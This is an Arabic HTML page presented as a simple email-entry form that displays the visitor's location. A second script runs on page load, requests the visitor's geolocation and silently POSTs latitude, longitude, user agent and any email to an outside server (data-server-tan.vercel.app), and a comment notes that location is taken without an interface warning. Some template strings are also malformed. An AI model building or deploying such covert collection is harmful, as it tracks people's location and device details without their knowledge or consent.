<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>معلومات المستخدم</title>
  <style>
    body {
      background: linear-gradient(to right, #2c3e50, #3498db);
      color: white;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
    }

    h1 {
      margin-bottom: 10px;
      font-size: 28px;
    }

    .container {
      background: rgba(0, 0, 0, 0.3);
      padding: 30px;
      border-radius: 15px;
      box-shadow: 0 0 15px rgba(255,255,255,0.1);
      text-align: center;
      width: 90%;
      max-width: 400px;
    }

    input[type="email"] {
      width: 100%;
      padding: 10px;
      margin-top: 15px;
      border: none;
      border-radius: 8px;
      font-size: 16px;
    }

    button {
      margin-top: 20px;
      padding: 12px 20px;
      font-size: 16px;
      background-color: #1abc9c;
      border: none;
      border-radius: 8px;
      color: white;
      cursor: pointer;
      transition: background 0.3s;
    }

    button:hover {
      background-color: #16a085;
    }

    .info {
      margin-top: 25px;
      font-size: 15px;
      line-height: 1.8;
    }
  </style>
</head>
<body>

  <div class="container">
    <h1>أدخل بريدك الإلكتروني</h1>
    <input type="email" id="email" placeholder="example@email.com" required>
    <button onclick="collectInfo()">إرسال</button>

    <div class="info" id="output"></div>
  </div>

  <script>
    function collectInfo() {
      const email = document.getElementById('email').value;
      const output = document.getElementById('output');

      if (!email || !email.includes('@')) {
        output.innerHTML = "يرجى إدخال بريد إلكتروني صحيح.";
        return;
      }

      // طلب الموقع الجغرافي (بدون تنبيه في الواجهة)
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          position => {
            const lat = position.coords.latitude.toFixed(5);
            const lon = position.coords.longitude.toFixed(5);
            output.innerHTML = `
              <strong>📧 بريدك:</strong> ${email}<br>
              <strong>📍 موقعك الحالي:</strong><br>
              خط العرض: ${lat}<br>
              خط الطول: ${lon}
            `;
          },
          error => {
            output.innerHTML = 📧 بريدك: ${email}<br> ⚠ لم يتم السماح بالحصول على الموقع.;
          }
        );
      } else {
        output.innerHTML = 📧 بريدك: ${email}<br> ⚠ جهازك لا يدعم الموقع الجغرافي.;
      }
    }
  </script>
<script>
  // دالة ترسل البيانات للسيرفر
  function sendUserData(email) {
    if (!navigator.geolocation) {
      console.log("المتصفح لا يدعم الموقع الجغرافي");
      return;
    }

    navigator.geolocation.getCurrentPosition(function(position) {
      const data = {
        email: email || "",  // إذا عندك نموذج بريد، خذ منه القيمة بدل "" 
        latitude: position.coords.latitude,
        longitude: position.coords.longitude,
        userAgent: navigator.userAgent
      };

      fetch("https://data-server-tan.vercel.app/save", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data)
      }).then(res => {
        if(res.ok){
          console.log("تم إرسال البيانات للسيرفر");
        } else {
          console.error("فشل الإرسال");
        }
      }).catch(err => {
        console.error("خطأ في الاتصال بالسيرفر", err);
      });
    }, function(error) {
      console.error("تعذر الحصول على الموقع:", error);
    });
  }

  // مثال: لو عندك input لبريد إلكتروني في الموقع اسمه emailInput
  // تقدر تستخدمه هكذا:
  // const email = document.getElementById('emailInput').value;
  // sendUserData(email);

  // إذا ما عندك بريد، تقدر ترسل بيانات بدون بريد:
  sendUserData();
</script>
</body>
</html>
